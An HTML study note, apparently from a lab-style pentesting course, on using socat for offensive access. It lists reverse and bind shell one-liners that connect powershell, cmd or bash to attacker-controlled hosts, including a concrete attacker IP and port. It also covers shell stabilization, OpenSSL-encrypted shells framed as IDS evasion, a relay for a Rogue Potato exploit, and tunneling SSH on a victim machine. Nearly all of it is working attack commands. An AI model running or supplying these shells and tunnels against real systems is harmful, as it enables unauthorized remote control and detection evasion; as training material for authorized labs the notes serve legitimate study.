<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>socat</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>socat</h1><br/><p>Socat is similar to netcat in some ways, but fundamentally different in many others. The easiest way to think about socat is as a connector between two points. In the interests of this room, this will essentially be a listening port and the keyboard, however, it could also be a listening port and a file, or indeed, two listening ports. All socat does is provide a link between two points</p><p></p><p><strong>Reverse Shell:</strong></p><p><strong>(Attacker Side)</strong></p><p>socat TCP-L:&lt;Port&gt; -</p><p></p><p>As always with socat, this is taking two points (a listening port, and standard input) and connecting them together. The resulting shell is unstable, but this will work on either Linux or Windows and is equivalent to nc -lvnp &lt;port&gt;.</p><p></p><p><strong>(Target Side)</strong></p><p><strong>(Windows:)</strong></p><p>socat TCP:&lt;Attacker-IP&gt;:&lt;Attacker-PORT&gt; EXEC:powershell.exe,pipes</p><p>socat TCP:&lt;Attacker-IP&gt;:&lt;Attacker-PORT&gt; EXEC:cmd.exe,pipes</p><p><strong>(Linux:)</strong></p><p>socat TCP:&lt;Attacker-IP&gt;:&lt;Attacker-PORT&gt; EXEC:&quot;bash -li&quot;</p><p></p><p><strong>Note:</strong> (Windows Target) The &quot;pipes&quot; option is used to force powershell (or cmd.exe) to use Unix style standard input and output.</p><p></p><p></p><p></p><p><strong>Bind Shell:</strong></p><p><strong>(Attacker Side)</strong></p><p>socat TCP:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt; -</p><p></p><p><strong>(Target Side)</strong></p><p><strong>(Windows:)</strong></p><p>socat TCP-L:&lt;PORT&gt; EXEC:powershell.exe,pipes</p><p>socat TCP-L:&lt;PORT&gt; EXEC:cmd.exe,pipes</p><p></p><p><strong>(Linux:)</strong></p><p>socat TCP-L:&lt;PORT&gt; EXEC:&quot;bash -li&quot;</p><p></p><p><strong>Stablization of shell in Socat (Linux Specific Only):</strong> [tty technique]</p><p></p><p><strong>Reverse Shell:</strong></p><p>(Attacker Side)</p><p>socat TCP-L:&lt;Port&gt; FILE:`tty`,raw,echo=0					[No spaces after comma]</p><p>(Target Side)</p><p>socat TCP:&lt;Attacker-IP&gt;:&lt;Attacker-PORT&gt; EXEC:&quot;bash -li&quot;,pty,stderr,sigint,setsid,sane</p><p></p><p></p><p><strong>Note:</strong> If, at any point, a socat shell is not working correctly, it&#39;s well worth increasing the verbosity by adding -d -d into the command. This is very useful for experimental purposes, but is not usually necessary for general use.</p><p></p><p><strong>Changing Terminal Size, mainly used for text editors such as Vim or Nano to run properly:</strong></p><p></p><p>In our own terminal run,</p><p>cd /tmp; stty -a</p><p>Get the values of “rows” &amp; “columns”</p><p></p><p>Then in our target machine shell run,</p><p>stty rows &lt;number&gt;</p><p>stty cols &lt;number&gt;</p><p></p><p></p><p><strong>Socat Encrypted Shells (To avoid anyone spying and evasion from IDS)</strong></p><p></p><p>First Generate the key and certificate. Combine them into a .pem file.</p><p>Keep one copy with attacker &amp; send one copy to target machine.</p><p>Use the following syntax</p><p></p><p><strong>.PEM generation:</strong></p><p></p><p>openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt</p><p>cat shell.key shell.crt &gt; shell.pem</p><p></p><p><strong>Reverse Shell: (Linux Example)</strong></p><p>(Attacker Side)</p><p>socat OPENSSL-LISTEN:&lt;PORT&gt;,cert=shell.pem,verify=0 -</p><p></p><p><strong>eg (With shell stablization - tty technique)</strong></p><p>socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty&#39;,raw,echo=0</p><p></p><p>(Target Side)</p><p>socat OPENSSL:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt;,verify=0 EXEC:/bin/bash</p><p>socat OPENSSL:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt;,verify=0 EXEC:&quot;bash -li&quot;</p><p></p><p><strong>eg (With shell stablization - tty technique)</strong></p><p>socat OPENSSL:10.10.10.5:53,verify=0 EXEC:&quot;bash -li&quot;,pty,stderr,sigint,setsid,sane</p><p></p><p><strong>Bind Shell: (Windows Example)</strong></p><p>(Attacker Side)</p><p>socat OPENSSL:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt;,verify=0 -</p><p>(Target Side)</p><p>socat OPENSSL-LISTEN:&lt;LOCAL-PORT&gt;,cert=shell.pem,verify=0 EXEC:powershell.exe,pipes</p><p>socat OPENSSL-LISTEN:&lt;LOCAL-PORT&gt;,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes</p><p></p><p></p><p><strong>Bind Shell Used for Rouge Potato Exploit </strong></p><p>(Create a Mallicious Server for the victim to connect to)</p><p>socat tcp-listen:135,reuseaddr,fork tcp:10.10.175.222:9999</p><p></p><p></p><p><strong>Socat Tunneling </strong></p><p>Here we will use <strong>Socat</strong> to <strong>Tunnel</strong> the <strong>localhost:22</strong> to a different selected <strong>unsed port</strong> on the machine say <strong>9090</strong>.</p><p>Once the Tunnel is successful, attacker can connect to port <strong>9090</strong> --→ which will be tunneled to <strong>localhost:22</strong>. </p><p>Thus access the<strong> SSH server </strong>on port <strong>9090</strong>.</p><p>On Victim Machine Run:</p><p></p><p>socat tcp-listen:9090,reuseaddr,fork tcp:localhost:22</p><p>eg.</p><p><img src="images/88-1.png" alt="images/88-1.png" /></p><p>Verify with Nmap whether tunneling was successful.</p><p>eg.</p><p><img src="images/88-2.png" alt="images/88-2.png" /></p></div>
</body>
</html>
